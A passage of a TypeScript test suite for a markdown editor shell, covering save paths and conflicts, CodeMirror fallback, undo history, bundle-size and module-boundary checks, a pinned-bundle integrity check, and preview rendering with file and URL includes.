    await tick();
    release();
    await p3;
    expect(hook).toHaveBeenLastCalledWith(`${CRLF_BOM}edit\r\nduring`);
    expect(m.shell.isDirty()).toBe(false);
    m.shell.destroy();
  });

  it('[E.8] a failed save keeps the document dirty, emits error and shows it; save() never rejects; a read-only shell does not save', async () => {
    const m = mount({ hooks: { save: async () => { throw new Error('quota exceeded'); } } });
    const errors: unknown[] = [];
    m.shell.on('error', (e) => errors.push([e.source, e.message]));
    type(m, 'x');
    await expect(m.shell.save()).resolves.toEqual({ ok: false, via: 'hook', error: 'quota exceeded' });
    expect(m.shell.isDirty()).toBe(true);
    expect(errors).toEqual([['save', 'quota exceeded']]);
    expect(toasts(m.root)).toEqual(['Could not save: quota exceeded']);
    m.shell.destroy();
    const hook = vi.fn(async () => undefined);
    const r = mount({ readOnly: true, hooks: { save: hook } });
    await expect(r.shell.save()).resolves.toEqual({ ok: false, error: 'read-only' });
    key(r, r.ta(), 's', { ctrl: true });
    await tick();
    expect(hook).not.toHaveBeenCalled();
    r.shell.destroy();
  });

  it('[E.8] round 3 (L9): a save conflict asks an editor that is not an assembled file (an app\'s, no openedHtml, not standalone) "The file you chose holds another version of this document…" — never "since this page opened it"; an assembled file\'s editor (standalone: true or openedHtml) is asked the opened-file question', async () => {
    const { SAVE_CONFLICT_MESSAGE, SAVE_CONFLICT_PICKED_MESSAGE } = await import('../src/carrier/shell');
    const saver = { save: async () => ({ via: 'file' as const, ok: false, error: 'conflict', conflict: true as const, picked: true, opened: false }), download: async () => ({ via: 'download' as const, ok: true, confirmed: false as const }), handleKey: () => null };
    for (const [o, want] of [[{}, SAVE_CONFLICT_PICKED_MESSAGE], [{ standalone: true }, SAVE_CONFLICT_MESSAGE], [{ openedHtml: '<html>opened</html>' }, SAVE_CONFLICT_MESSAGE]] as const) {
      const m = mount({ assemble: async (t: string) => `<html>${t.length}</html>`, saver, ...o });
      type(m, 'q');
      expect(await m.shell.save()).toMatchObject({ conflict: true });
      const q = m.root.querySelector('[role="alertdialog"]')!;
      expect(m.root.getElementById(q.getAttribute('aria-describedby')!)?.textContent, JSON.stringify(o)).toBe(want);
      m.shell.destroy();
    }
  });

  it('[E.8] standalone host: save() assembles the current text and hands { text, html } to the saver; success clears dirty; a cancelled picker is no error; a failure keeps dirty', async () => {
    const assemble = vi.fn(async (t: string) => `<html data-len="${t.length}"></html>`);
    const ok = fakeSaver({ via: 'file', ok: true });
    const m = mount({ assemble, saver: ok.saver });
    type(m, 'y');
    await expect(m.shell.save()).resolves.toEqual({ ok: true, via: 'file' });
    expect(ok.saves).toEqual([{ text: `${CRLF_BOM}y`, html: `<html data-len="${CRLF_BOM.length + 1}"></html>` }]);
    expect(m.shell.isDirty()).toBe(false);
    m.shell.destroy();

    const cancelled = fakeSaver({ via: 'file', ok: false, error: 'cancelled' });
    const c = mount({ assemble, saver: cancelled.saver });
    const errors: unknown[] = [];
    c.shell.on('error', (e) => errors.push(e));
    type(c, 'z');
    await expect(c.shell.save()).resolves.toEqual({ ok: false, via: 'file', error: 'cancelled', cancelled: true });
    expect(errors).toEqual([]);
    expect(c.shell.isDirty()).toBe(true);
    c.shell.destroy();

    const broken = fakeSaver({ via: 'download', ok: false, error: 'Downloads are not available here.' });
    const b = mount({ assemble, saver: broken.saver });
    type(b, 'w');
    expect((await b.shell.save()).ok).toBe(false);
    expect(b.shell.isDirty()).toBe(true);
    b.shell.destroy();

    const none = mount({});
    expect((await none.shell.save()).ok).toBe(false);
    none.shell.destroy();
  });

  it('[E.8] on a served page the save shows the served-page notice (#orz-served-note) — nothing is written or downloaded until the reader picks "Download a copy"', async () => {
    const assemble = async (t: string) => `<html>${t.length}</html>`;
    const served = fakeSaver({ via: 'served-notice' });
    const m = mount({ assemble, saver: served.saver });
    type(m, 'q');
    await expect(m.shell.save()).resolves.toMatchObject({ ok: false, via: 'served-notice' });
    expect(served.downloads).toEqual([]);
    const note = m.root.querySelector('#orz-served-note')!;
    expect(note.textContent).toContain('opened from a web address, so it cannot be saved over');
    expect(m.shell.isDirty()).toBe(true);
    (note.querySelector('button.orz-btn--primary') as HTMLElement).click();
    await tick(10);
    expect(served.downloads).toEqual([`<html>${CRLF_BOM.length + 1}</html>`]);
    expect(m.shell.isDirty()).toBe(false);
    expect(m.root.querySelector('#orz-served-note')).toBeNull();
    m.shell.destroy();
  });

  it('[E.8] without a saver the shell uses createSaver: a connected host (connectHost) receives { source: exact text, html } and the dirty state', async () => {
    const posted: unknown[] = [];
    const host = {
      connected: () => true, protocols: () => ({ save: true, ai: false, include: false }), origin: () => 'https://app.example', aiOperations: () => [],
      save: async (p: unknown) => { posted.push(['save', p]); return { ok: true }; },
      requestAi: async () => ({ ok: false }), requestInclude: async () => null,
      setDirty: (d: boolean) => posted.push(['dirty', d]), dispose() {},
    } as unknown as HostConnection;
    const m = mount({ host, assemble: (t) => `<html>${t.length}</html>`, kind: 'md', fileName: 'week3.md.html' });
    type(m, '1');
    await expect(m.shell.save()).resolves.toEqual({ ok: true, via: 'host' });
    expect(posted).toEqual([['dirty', true], ['save', { source: `${CRLF_BOM}1`, html: `<html>${CRLF_BOM.length + 1}</html>` }], ['dirty', false]]);
    m.shell.destroy();
  });
});

// ── E.9 engines ──────────────────────────────────────────────────────────

describe('engines', () => {
  it('[E.9] codemirror6Adapter starts as an editable textarea and keeps it when CodeMirror cannot load (offline, or modules without the needed exports): ready() reports the error, the shell emits an adapter error and a warning toast, editing and saving still work', async () => {
    for (const loadModules of [() => Promise.reject(new Error('offline')), () => ({}) as never]) {
      const hook = vi.fn(async () => undefined);
      const m = mount({ adapter: codemirror6Adapter({ loadModules }), hooks: { save: hook } });
      const errors: string[] = [];
      m.shell.on('error', (e) => errors.push(e.source));
      expect(m.ta()).not.toBeNull();
      type(m, 'offline edit');
      const r = await m.shell.ready;
      expect(r.engine).toBe('textarea');
      expect(r.error).toBeInstanceOf(Error);
      expect(m.shell.adapter.name).toBe('textarea');
      expect(toasts(m.root)).toEqual(['The code editor could not be loaded — basic editing is available.']);
      expect(m.shell.getText()).toBe(`${CRLF_BOM}offline edit`);
      await m.shell.save();
      expect(hook).toHaveBeenCalledWith(`${CRLF_BOM}offline edit`);
      m.shell.destroy();
      void errors;
    }
  });

  it('[E.9] the textarea engine needs nothing from the network, keeps its own undo history (typing groups, a programmatic edit is one step, resetHistory clears it) and maps the selection across an edit', () => {
    const m = mount({ text: 'abc\ndef' });
    const ta = m.ta();
    ta.setSelectionRange(5, 5);
    m.shell.setText('XXabc\ndef');
    expect([ta.selectionStart, ta.selectionEnd]).toEqual([7, 7]);
    m.shell.setText('reset', { resetHistory: true });
    expect(m.shell.undo()).toBe(false);
    type(m, '1');
    m.shell.setText('replaced');
    m.shell.undo();
    expect(m.shell.getText()).toBe('reset1');
    m.shell.undo();
    expect(m.shell.getText()).toBe('reset');
    // Cmd/Ctrl+Z and Shift+Cmd/Ctrl+Z are the engine's own
    key(m, ta, 'z', { shift: true, ctrl: true });
    expect(m.shell.getText()).toBe('reset1');
    key(m, ta, 'z', { meta: true });
    expect(m.shell.getText()).toBe('reset');
    m.shell.destroy();
  });

  it('[E.9] isCodeMirror6Modules accepts module namespaces with the needed exports and refuses anything else', () => {
    const fn = () => undefined;
    const good = { state: { EditorState: fn }, view: { EditorView: fn, keymap: {} }, commands: { history: fn, defaultKeymap: [], historyKeymap: [], undo: fn, redo: fn }, language: { syntaxHighlighting: fn, defaultHighlightStyle: {} }, markdown: { markdownLanguage: {} } };
    expect(isCodeMirror6Modules(good)).toBe(true);
    expect(isCodeMirror6Modules({ ...good, markdown: {} })).toBe(false);
    expect(isCodeMirror6Modules({ ...good, commands: { ...good.commands, undo: 1 } })).toBe(false);
    expect(isCodeMirror6Modules(null)).toBe(false);
  });
});

// ── E.10 module boundaries ───────────────────────────────────────────────

function valueImports(entry: string): Set<string> {
  const seen = new Set<string>();
  const queue = [entry];
  while (queue.length) {
    const f = queue.pop()!;
    if (seen.has(f)) continue;
    seen.add(f);
    for (const m of readFileSync(f, 'utf8').matchAll(/^\s*(?:import|export)\s+(?!type\b)(?:[^'";]*?from\s*)?['"]([^'"]+)['"]/gm)) {
      if (!m[1].startsWith('.')) continue;
      const dir = f.slice(0, f.lastIndexOf('/'));
      const parts: string[] = [];
      for (const p of `${dir}/${m[1]}`.split('/')) { if (p === '..') parts.pop(); else if (p !== '.' && p) parts.push(p); }
      const base = parts.join('/').replace(/\.js$/, '');
      queue.push(existsSync(`${base}.ts`) ? `${base}.ts` : `${base}/index.ts`);
    }
  }
  return seen;
}

/**
 * Measured (esbuild, ESM, browser, minified): the editor's own modules 32,823 B on 2026-10-05; 44,825 B on
 * 2026-10-06 after closed loop 2 round 1 (hooks, formats, pluggable preview, CSP, gating, patch history).
 * The whole entry is 1.17 MB with the parser, which header.ts brings in (kitParser); CodeMirror is not in it.
 * Bound ≈ +30 %.
 */
/** The editor's own modules in the shipped (CommonJS dist) bundle: 51.8 KB before round 2 of closed loop 2, 64.9 KB after. */
// 68,516 B on 2026-10-08 (round 1 of the carrier-app loop: the syntax highlighter, file includes through
// fetchInclude, the missing-include note, the save-conflict question); bound ~10 % above.
// 79,093 B with 2.4.0 (applyEdits, select, setFocusRange, the focus-range field); bound ~10 % above.
// 87,027 B with 2.5.0 (the twinLinks option: render context and saves); bound ~10 % above.
const EDITOR_OWN_LIMIT = 96_000;
/** The whole shipped editor bundle (parser, one KaTeX, editor; no CodeMirror): 967 KB before round 2, 982 KB after. */
// 1,066,302 B with 2.4.0 (CONTENT_THEME_SCRIPT and the frame's drawing script in bodyScripts); bound ~8 % above.
const EDITOR_BUNDLE_LIMIT = 1_150_000;

describe('module boundaries', () => {
  it('[E.10] carrier/shell and carrier/read stay parser-free and do not import the editor; carrier does not either; the package exports ./carrier/editor; what ships (the CommonJS dist entry, bundled) holds the editor\'s own code under 96 KB, the whole bundle under 1.15 MB with one KaTeX, and no CodeMirror', async () => {
    for (const entry of ['src/carrier/shell/index.ts', 'src/carrier/read.ts', 'src/carrier.ts', 'src/index.ts']) {
      expect([...valueImports(entry)].filter((f) => f.includes('carrier/editor')), entry).toEqual([]);
    }
    const shellGraph = [...valueImports('src/carrier/shell/index.ts')];
    expect(shellGraph.filter((f) => /src\/index\.ts|header\.ts|parser\.ts|document\.ts/.test(f))).toEqual([]);
    const pkg = JSON.parse(readFileSync('package.json', 'utf8')) as { exports: Record<string, string>; files: string[] };
    expect(pkg.exports['./carrier/editor']).toBe('./dist/carrier/editor/index.js');
    expect(pkg.files).toContain('vendor');
    // What ships (item 17): the CommonJS dist entry, bundled as a carrier bundles `orz-markdown/carrier/editor`.
    // The editor's own modules, and the whole bundle with the parser and ONE KaTeX (an ESM bundle of src would
    // carry two: `katex/contrib/mhchem` resolves to katex.mjs there while the plugin requires katex.js).
    const { build } = await import('esbuild');
    const shipped = existsSync('dist/carrier/editor/index.js');
    const entry = shipped ? 'dist/carrier/editor/index.js' : 'src/carrier/editor/index.ts';
    const out = await build({ entryPoints: [entry], bundle: true, minify: true, platform: 'browser', format: 'esm', write: false, logLevel: 'silent', metafile: true });
    const own = Object.entries(out.metafile!.outputs)[0][1].inputs;
    const editorBytes = Object.entries(own).filter(([f]) => f.startsWith(shipped ? 'dist/carrier/editor/' : 'src/carrier/editor/')).reduce((n, [, v]) => n + v.bytesInOutput, 0);
    expect(editorBytes).toBeLessThan(EDITOR_OWN_LIMIT);
    expect(out.outputFiles[0].contents.byteLength).toBeLessThan(EDITOR_BUNDLE_LIMIT);
    expect(Object.keys(own).filter((f) => f.includes('@codemirror') || f.includes('vendor/'))).toEqual([]);
    if (shipped) expect(Object.keys(own).filter((f) => /katex\/dist\/katex\.m?js$/.test(f))).toHaveLength(1);
    if (existsSync('dist/carrier/editor/index.js')) {
      const dist = (await import('../dist/carrier/editor/index.js')) as Record<string, unknown>;
      expect(typeof dist.createEditorShell).toBe('function');
    }
  });

  it('[E.10] importing the editor adds no browser-global access to the parser\'s own: its bundle loads where window, document, storage, navigator, location and the rest throw, touching exactly what the parser entry alone touches (KaTeX\'s and markdown-it\'s feature detection) — no storage, no navigator, no location, no CodeMirror', async () => {
    const { build } = await import('esbuild');
    const load = async (entry: string) => {
      const out = await build({ entryPoints: [entry], bundle: true, platform: 'browser', format: 'cjs', write: false, logLevel: 'silent' });
      const touched: string[] = [];
      const ctx: Record<string, unknown> = { module: { exports: {} }, setTimeout, clearTimeout, console };
      for (const name of ['window', 'document', 'localStorage', 'sessionStorage', 'indexedDB', 'navigator', 'location', 'self', 'parent', 'fetch', 'crypto', 'CSSStyleSheet', 'ResizeObserver', 'requestAnimationFrame', 'OrzCodeMirror6']) {
        Object.defineProperty(ctx, name, { get() { touched.push(name); throw new Error(`touched ${name}`); } });
      }
      ctx.exports = (ctx.module as { exports: unknown }).exports;
      ctx.globalThis = ctx;
      vm.createContext(ctx);
      vm.runInContext(out.outputFiles[0].text, ctx);
      return { touched: touched.sort(), api: (ctx.module as { exports: Record<string, unknown> }).exports };
    };
    const editor = await load('src/carrier/editor/index.ts');
    const parser = await load('src/index.ts');
    expect(Object.keys(editor.api)).toContain('createEditorShell');
    expect(editor.touched).toEqual(parser.touched);
    expect(editor.touched.filter((n) => n !== 'document' && n !== 'self')).toEqual([]);
  }, 30_000);
});

// ── E.11 the pinned CodeMirror bundle ────────────────────────────────────

describe('the pinned CodeMirror 6 bundle', () => {
  it('[E.11] vendor/codemirror6.js is the pinned build: its SHA-384 is CODEMIRROR6_INTEGRITY, its size CODEMIRROR6_BYTES, it is script-safe, its versions are the installed (exact devDependency) versions with ONE @codemirror/state, and it is served from jsDelivr under this package version', () => {
    const bytes = readFileSync(CODEMIRROR6_PATH);
    expect(`sha384-${createHash('sha384').update(bytes).digest('base64')}`).toBe(CODEMIRROR6_INTEGRITY);
    expect(bytes.byteLength).toBe(CODEMIRROR6_BYTES);
    const code = bytes.toString('utf8');
    expect(isScriptSafe(code)).toBe(true);
    expect(code).toMatch(new RegExp(`^"use strict";var ${CODEMIRROR6_GLOBAL}=`));
    const pkg = JSON.parse(readFileSync('package.json', 'utf8')) as { devDependencies: Record<string, string> };
    for (const [name, version] of Object.entries(CODEMIRROR6_VERSIONS)) {
      expect(JSON.parse(readFileSync(`node_modules/${name}/package.json`, 'utf8')).version, name).toBe(version);
      if (pkg.devDependencies[name]) expect(pkg.devDependencies[name], name).toBe(version); // exact, no range
      expect(code, name).toContain(`"${name}":"${version}"`);
    }
    // one copy of @codemirror/state in the dependency tree
    const lock = JSON.parse(readFileSync('package-lock.json', 'utf8')) as { packages: Record<string, { version: string }> };
    expect(Object.keys(lock.packages).filter((p) => p.endsWith('node_modules/@codemirror/state'))).toEqual(['node_modules/@codemirror/state']);
    expect(CODEMIRROR6_URL).toBe(`https://cdn.jsdelivr.net/npm/orz-markdown@${VERSION}/vendor/codemirror6.js`);
  });
});

// ── E.12 the md preview renderer ─────────────────────────────────────────

describe('renderMarkdownPreview', () => {
  it('[E.12] renders the body without its header, with twin links, every block stamped with data-src-line = its 0-based line in the whole text (header, BOM and CR LF counted), otherwise exactly what md.render gives', () => {
    const text = '﻿{{nyml\r\nkind: document\r\ntitle: T\r\n}}\r\n\r\n# Head\r\n\r\nSee [week 2](week2.slides.md#q) and [web](https://x.example/a.md).\r\n\r\n```js\r\ncode\r\n```\r\n\r\n- item\r\n';
    const html = renderMarkdownPreview(text);
    expect(html).not.toContain('kind: document');
    expect(html).toContain('<h1 id="head" tabindex="-1" data-src-line="5">Head</h1>');
    expect(html).toContain('<p data-src-line="7">');
    expect(html).toContain('href="week2.slides.html#q"');
    expect(html).toContain('href="https://x.example/a.md"');
    expect(html).toMatch(/<pre><code class="language-js" data-src-line="9">|data-src-line="9"/);
    expect(html).toContain('<ul data-src-line="13">');
    const body = withoutHeader(text).body;
    expect(html.replace(/ data-src-line="\d+"/g, '')).toBe(md.render(body, { orzTwinLinks: true }));
    expect(renderMarkdownPreview('[a](b.md)', { twinLinks: false })).toContain('href="b.md"');
  });
});

describe('includes in apps and missing includes (2.2.0, round 1 of the carrier-app loop)', () => {
  it('[E.45] previewIncludes is the one include resolution of every preview surface: a file include from the record, else fetchInclude(path as written); a URL include from fetchInclude(url), else the record; each host answer once per cache; without a host the record alone', async () => {
    const asked: string[] = [];
    const fetchInclude = async (t: string): Promise<string | null> => { asked.push(t); return t === 'parts/a.md' ? 'A from host\n' : t === 'parts/rec.md' ? 'REC from host\n' : t.startsWith('https://ex.test/live') ? 'LIVE from host\n' : null; };
    const cache = new Map<string, unknown>();
    const text = '# T\n\n{{md parts/a.md}}\n\n{{md parts/rec.md}}\n\n{{md https://ex.test/live.md}}\n\n{{md https://ex.test/g.md}}\n';
    const includes = { 'parts/rec.md': 'REC from record\n', 'https://ex.test/g.md': 'G from record\n' };
    const r = await previewIncludes(text, { includes, fetchInclude, cache });
    expect(r.includes).toEqual({ 'parts/a.md': 'A from host\n', ...includes });
    expect(await r.fetcher('https://ex.test/live.md')).toBe('LIVE from host\n');
    expect(await r.fetcher('https://ex.test/g.md')).toBe('G from record\n');
    expect(await r.fetcher('https://ex.test/none.md')).toBeNull();
    const again = await previewIncludes(text, { includes, fetchInclude, cache });
    await again.fetcher('https://ex.test/live.md');
    expect(asked.filter((a) => a === 'parts/a.md' || a === 'https://ex.test/live.md')).toEqual(['parts/a.md', 'https://ex.test/live.md']); // once per cache
    expect(asked).not.toContain('parts/rec.md'); // the record answers a file include first
    const bare = await previewIncludes(text, { includes });
    expect(bare.includes).toBe(includes);
    expect(await bare.fetcher('https://ex.test/g.md')).toBe('G from record\n');
  });

  it('[E.29] a file include the record does not hold goes to fetchInclude(path) (the path as written), once per shell through ctx.cache — the record answers first; URL includes as before; the shell\'s includes option (FC-19 §3 includes) reaches the renderer', async () => {
    const asked: string[] = [];
    const fetchInclude = async (t: string) => { asked.push(t); return t === 'parts/a.md' ? '## From the app\n' : t === 'https://x.test/u.md' ? '## From a URL\n' : null; };
    const cache = new Map<string, unknown>();
    const text = '# Doc\n\n{{md parts/a.md}}\n\n{{md parts/recorded.md}}\n\n{{md https://x.test/u.md}}\n';
    const html = await renderMarkdownPreviewWithIncludes(text, { fetchInclude, cache, includes: { 'parts/recorded.md': '## From the record\n' } });
    expect(html).toContain('From the app</h2>');
    expect(html).toContain('From the record</h2>');
    expect(html).toContain('From a URL</h2>');
    expect(asked.sort()).toEqual(['https://x.test/u.md', 'parts/a.md']);
    await renderMarkdownPreviewWithIncludes(text, { fetchInclude, cache, includes: { 'parts/recorded.md': '## From the record\n' } });
    expect(asked).toHaveLength(2);
    // through the shell: the includes option and the hook reach the renderer
    let seen: RenderContext | null = null;
    const m = mount({ text: '{{md parts/opt.md}}\n', includes: { 'parts/opt.md': '## From the option\n' }, hooks: { fetchInclude }, render: (t, ctx) => { seen = ctx; return renderMarkdownPreviewWithIncludes(t, ctx); } });
    await tick(60);
    expect(seen!.includes).toEqual({ 'parts/opt.md': '## From the option\n' });
    expect(typeof seen!.fetchInclude).toBe('function');
    expect(await renderMarkdownPreviewWithIncludes('{{md parts/opt.md}}\n', seen!)).toContain('From the option</h2>');
    m.shell.destroy();
  });

  it('[E.31] refreshPreview renders now even for an unchanged text; refreshPreview({ includes }) replaces the renderer\'s include record (null or {}: none) and forgets the fetched includes, so each include is read again from the new record or fetchInclude; saves write the latest record (round 3 of the carrier-app loop, L7: what the preview shows is what the file keeps) while the opened bytes keep the mounted one', async () => {
    const asked: string[] = [];
    let answer = 'FIRST';
    const fetchInclude = async (t: string) => { asked.push(t); return `## ${answer} ${t}\n`; };
    const renders: string[] = [];
    const assembled: Array<Record<string, string> | undefined> = [];
    const m = mount({
      text: '{{md parts/a.md}}\n\n{{md parts/b.md}}\n', includes: { 'parts/a.md': '## Record A\n' }, hooks: { fetchInclude },
      assemble: (t, o) => { assembled.push(o?.includes); return `<html>${t}</html>`; },
      render: async (t, ctx) => { const h = await renderMarkdownPreviewWithIncludes(t, ctx); renders.push(h); return h; },
    });
    await tick(80);
    expect(renders.at(-1)).toContain('Record A</h2>');
    expect(renders.at(-1)).toContain('FIRST parts/b.md</h2>');
    expect(asked).toEqual(['parts/b.md']);
    const n = renders.length;
    await m.shell.refreshPreview(); // the same text: rendered again (the fetched include is kept)
    expect(renders.length).toBe(n + 1);
    expect(asked).toEqual(['parts/b.md']);
    answer = 'SECOND';
    await m.shell.refreshPreview({ includes: { 'parts/b.md': '## Record B\n' } });
    expect(renders.at(-1)).toContain('Record B</h2>');
    expect(renders.at(-1)).toContain('SECOND parts/a.md</h2>'); // a left the record: fetched again
    expect(asked).toEqual(['parts/b.md', 'parts/a.md']);
    // a save now writes the new record (the unchanged text too: it is not the opened file any more), while
    // the opened bytes the saver proves a file handle with keep the mounted record (a picker page, file:)
    const g = globalThis as unknown as Record<string, unknown>;
    const had = Object.prototype.hasOwnProperty.call(g, 'window');
    const prev = g.window;
    const written: string[] = [];
    g.window = { location: { protocol: 'file:', href: 'file:///me/n.md.html', pathname: '/me/n.md.html' }, showSaveFilePicker: async () => ({ name: 'n.md.html', getFile: async () => ({ text: async () => 'other bytes' }), createWritable: async () => ({ write: async (d: string) => { written.push(d); }, close: async () => undefined }) }) };
    try {
      const n1 = assembled.length;
      expect(await m.shell.save()).toMatchObject({ ok: true, via: 'file' });
      const now = assembled.slice(n1).map((x) => JSON.stringify(x));
      expect(now.sort()).toEqual([JSON.stringify({ 'parts/a.md': '## Record A\n' }), JSON.stringify({ 'parts/b.md': '## Record B\n' })].sort());
      expect(written).toHaveLength(1);
    } finally {
      if (had) g.window = prev; else delete g.window;
    }
    await m.shell.refreshPreview({ includes: null });
    expect(renders.at(-1)).toContain('SECOND parts/b.md</h2>'); // the cache was cleared
    expect(asked).toEqual(['parts/b.md', 'parts/a.md', 'parts/a.md', 'parts/b.md']);
    // with no record, a save writes none
    const n2 = assembled.length;
    await m.shell.save().catch(() => undefined);
    expect(assembled.length).toBe(n2 + 1);
    expect(assembled.at(-1)).toBeUndefined();
    m.shell.destroy();
    await m.shell.refreshPreview({ includes: {} }); // after destroy: nothing
  });

  it('[E.31] round 4 (F5): after refreshPreview({ includes }), a file on disk holding the opened text with those latest includes (an app\'s server resolved them again) is known content — the save writes, no question; another text on disk still asks', async () => {
    const T = '# Doc\n\n{{md part.md}}\n';
    const assemble = (t: string, o?: { includes?: Record<string, string> }) => assembleEnvelope(t, { kind: 'md', shellVersion: '1.0.0', delivery: 'cdn', headHtml: '', bodyHtml: '<main></main>', ...(o?.includes ? { includes: o.includes } : {}) });
    const I1 = { 'part.md': 'one\n' };
    const I2 = { 'part.md': 'two\n' };
    const g = globalThis as unknown as Record<string, unknown>;
    const had = Object.prototype.hasOwnProperty.call(g, 'window');
    const prev = g.window;
    const run = async (disk: string, refresh: boolean) => {
      let content = disk;
      g.window = { location: { protocol: 'https:', href: 'https://app.example/edit', pathname: '/edit' }, showSaveFilePicker: async () => ({ name: 'n.md.html', getFile: async () => ({ text: async () => content }), createWritable: async () => { let next = ''; return { write: async (d: string) => { next += d; }, close: async () => { content = next; } }; } }) };
      const m = mount({ text: T, includes: I1, assemble, fileName: 'n.md.html' });
      if (refresh) await m.shell.refreshPreview({ includes: I2 });
      type(m, 'Edited.\n');
      const r = await m.shell.save();
      const out = { r, written: content === assemble(m.shell.getText(), { includes: refresh ? I2 : I1 }), asked: m.root.querySelectorAll('[role="alertdialog"]').length };
      m.shell.destroy();
      return out;
    };
    try {
      expect(await run(assemble(T, { includes: I2 }), true)).toMatchObject({ r: { ok: true, via: 'file' }, written: true, asked: 0 });
      // without the refresh the page never saw those includes: a change, asked about
      expect(await run(assemble(T, { includes: I2 }), false)).toMatchObject({ r: { conflict: true }, written: false, asked: 1 });
      expect(await run(assemble(`${T}Agent.\n`, { includes: I2 }), true)).toMatchObject({ r: { conflict: true }, written: false, asked: 1 });
    } finally {
      if (had) g.window = prev; else delete g.window;
    }
  });

  it('[E.30] an include directive that resolved to nothing renders a quiet note — "Included file not available: <target>" (p.orz-include-missing, role note) keeping the directive in data-md, so copy-as-Markdown gives back the directive; missingIncludes: false renders nothing as the parser does', async () => {
    const html = renderMarkdownPreview('# Doc\n\n{{md part.md}}\n\nAfter.\n');
    expect(html).toContain('<p class="orz-include-missing" role="note" data-md="{{md part.md}}"><small>Included file not available: part.md</small></p>');
    expect(html).toContain('<p data-src-line="4">After.</p>');
    expect(renderMarkdownPreview('{{markdown <b>x.md}}\n')).toContain('data-md="{{markdown &lt;b&gt;x.md}}"><small>Included file not available: &lt;b&gt;x.md</small>');
    expect(await renderMarkdownPreviewWithIncludes('{{md-include https://x.test/gone.md}}\n', { fetchInclude: async () => null })).toContain('Included file not available: https://x.test/gone.md');
    expect(renderMarkdownPreview('{{md part.md}}\n', { missingIncludes: false })).toBe('');
    expect(renderMarkdownPreview('{{md part.md}}\n', { includes: { 'part.md': 'Here.\n' } })).not.toContain('orz-include-missing');
    // copy-as-Markdown recovers the directive
    const { Window } = await import('happy-dom');
    const w = new Window();
    const { browserRuntimeScript } = await import('../src/runtime');
    const g = globalThis as unknown as { OrzMarkdownRuntime?: { elementToMarkdown(n: unknown): string } };
    const saved = g.OrzMarkdownRuntime;
    (0, eval)(browserRuntimeScript);
    try {
      const root = w.document.createElement('div');
      root.className = 'markdown-body';
      root.innerHTML = html;
      expect(g.OrzMarkdownRuntime!.elementToMarkdown(root)).toContain('{{md part.md}}');
      expect(g.OrzMarkdownRuntime!.elementToMarkdown(root)).not.toContain('not available');
    } finally {
      if (saved) g.OrzMarkdownRuntime = saved; else delete g.OrzMarkdownRuntime;
    }
  });

  it('[E.28] the shell\'s own saver shows the served-page notice only for an assembled file (standalone: true or openedHtml given): on an app\'s page (no hooks.save, no file) an http(s) save goes to the picker, else a download — never the notice', async () => {
    const assemble = async (t: string) => `<html>${t.length}</html>`;
    const g = globalThis as unknown as Record<string, unknown>;
    const had = Object.prototype.hasOwnProperty.call(g, 'window');
    const prev = g.window;
    const picked: unknown[] = [];
    // the saver's page (the global window, as in a browser): an app served over https with a picker
    g.window = { location: { protocol: 'https:', href: 'https://app.example/edit', pathname: '/edit', origin: 'https://app.example' }, showSaveFilePicker: async (o: unknown) => { picked.push(o); return { name: 'document.md.html', createWritable: async () => ({ write: async () => undefined, close: async () => undefined }) }; } };
    try {
      const app = mount({ assemble });
      type(app, 'q');
      expect(await app.shell.save()).toMatchObject({ ok: true, via: 'file' });
      expect([picked.length, app.root.querySelector('#orz-served-note')]).toEqual([1, null]);
      app.shell.destroy();
      for (const o of [{ standalone: true }, { openedHtml: '<html>opened</html>' }] as const) {
        const file = mount({ assemble, ...o });
        type(file, 'q');
        expect(await file.shell.save()).toMatchObject({ ok: false, via: 'served-notice' });
        expect(file.root.querySelector('#orz-served-note')).not.toBeNull();
        file.shell.destroy();
      }
      expect(picked.length).toBe(1);
    } finally {
      if (had) g.window = prev; else delete g.window;
    }
  });
});

// ── round 1 of closed loop 2: findings A-2…A-6, B-3…B-19 ─────────────────

/** The shell's preview frame, driven from the test: what the shell posts to it, and messages "from" it. */
function frameOf(m: Mounted) {
  // the live frame: the last one (2.5.0, D-100: a rebuilt frame document loads under the previous frame, which stays as a picture until it has drawn)
  const iframe = [...m.root.querySelectorAll('iframe')].at(-1) as HTMLIFrameElement;
  const cw = iframe.contentWindow as unknown as { postMessage: unknown };
  const posted: Array<Record<string, unknown>> = [];
  cw.postMessage = (msg: Record<string, unknown>) => { posted.push(msg); };
  const say = (data: unknown) => { m.win.dispatchEvent(new m.win.MessageEvent('message', { data, source: cw as never }) as unknown as Event); };
  return { iframe, posted, say };
}
/** `navigator.userActivation.isActive` as the browser would report it (the shell no longer reads it: window messages never act). */
const activation = (m: Mounted, isActive: boolean) => Object.defineProperty(m.win.navigator, 'userActivation', { value: { isActive }, configurable: true });
/** The secret the shell wrote on the bridge's `<script>` in the frame document. */
const secretOf = (iframe: { srcdoc: string }): string => /data-orz-preview-secret="([^"]*)"/.exec(String(iframe.srcdoc))?.[1] ?? '';
/**
 * The shell's preview frame with the default bridge's authenticated handshake done: a fake
 * MessageChannel on the page, a ready carrying the frame's secret; `bridge(msg)` is a report through
 * the port (the reader's own trusted event in the frame), `sent` what the shell posts through it.
 */
function authFrameOf(m: Mounted) {
  const f = frameOf(m);
  const sent: Array<Record<string, unknown>> = [];
  let shellSide: { onmessage: ((e: { data: unknown }) => void) | null; closed: boolean } | null = null;
  (m.win as unknown as Record<string, unknown>).MessageChannel = class {
    port1 = { onmessage: null, closed: false, postMessage(x: Record<string, unknown>) { sent.push(x); }, close() { this.closed = true; } };
    port2 = {};
    constructor() { shellSide = this.port1; }
  };
  f.say({ type: 'orz-preview-ready', channel: 'chan-1', secret: secretOf(f.iframe) });
  if (!shellSide) throw new Error('the shell handed no port for the right secret');
  const port = shellSide as { onmessage: ((e: { data: unknown }) => void) | null; closed: boolean };
  const bridge = (data: unknown) => port.onmessage?.({ data });
  return { ...f, sent, bridge, port };
}

describe('render acknowledgements after the handshake (loop 2 round 4, M28)', () => {
  it('[E.14] once a port is handed, a render acknowledgement posted on the window (a replaced document\'s) is ignored — no pacing ack, no anchors, no subscriber call; the same acknowledgement through the port is taken', async () => {
    const m = mount();
    const f = authFrameOf(m);
    const seen: unknown[] = [];
    m.shell.preview.on('orz-preview-rendered', (d) => seen.push(d));
    f.say({ type: 'orz-preview-rendered', id: 1, anchors: [[1, 0]], max: 10 });
    await tick();
    expect(seen).toEqual([]);
    f.bridge({ type: 'orz-preview-rendered', id: 1, anchors: [[1, 0]], max: 10 });
    await tick();
    expect(seen).toHaveLength(1);
    m.shell.destroy();
  });
});

describe('the exact text across undo (A-3, A-4)', () => {
